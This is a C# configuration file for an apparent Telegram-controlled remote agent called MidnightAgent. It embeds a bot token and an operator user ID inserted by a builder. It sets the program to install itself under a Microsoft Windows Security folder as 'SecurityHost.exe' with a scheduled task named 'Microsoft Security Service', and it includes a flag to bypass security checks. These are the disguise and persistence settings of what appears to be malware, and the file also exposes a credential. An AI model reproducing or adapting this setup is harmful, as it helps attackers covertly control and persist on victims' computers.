namespace MidnightAgent.Core
{
    /// <summary>
    /// Configuration class - values are replaced by Builder
    /// </summary>
    public static class Config
    {
        // ===== VERSION INFO =====
        public const string Version = "0.6.13";
        public const string BuildNumber = "150226";
        public static string FullVersion => $"{Version} ({BuildNumber})";
        // ========================
        
        // ===== REPLACED BY BUILDER =====
        public const string BotToken = "8478359981:AAHwoPapiD-5ow8kZPvdj08omAIGW5qezp0";
        public const string UserId = "5949927014";
        // ================================

        // Installation settings
        public const string InstallFolder = @"C:\ProgramData\Microsoft\Windows\Security";
        public const string ExeName = "SecurityHost.exe";
        public const string TaskName = "Microsoft Security Service";
        
        // Security settings
        public const bool BypassSecurityChecks = true;  // Set to false in production!
        
        // Telegram settings
        public const int PollingTimeout = 30;
        public const int ReconnectDelay = 5000; // ms
        
        // Update settings
        public const string TempFolder = @"C:\ProgramData\Microsoft\Windows\Temp";

        /// <summary>
        /// Full path to installed executable
        /// </summary>
        public static string InstallPath => System.IO.Path.Combine(InstallFolder, ExeName);
    }
}
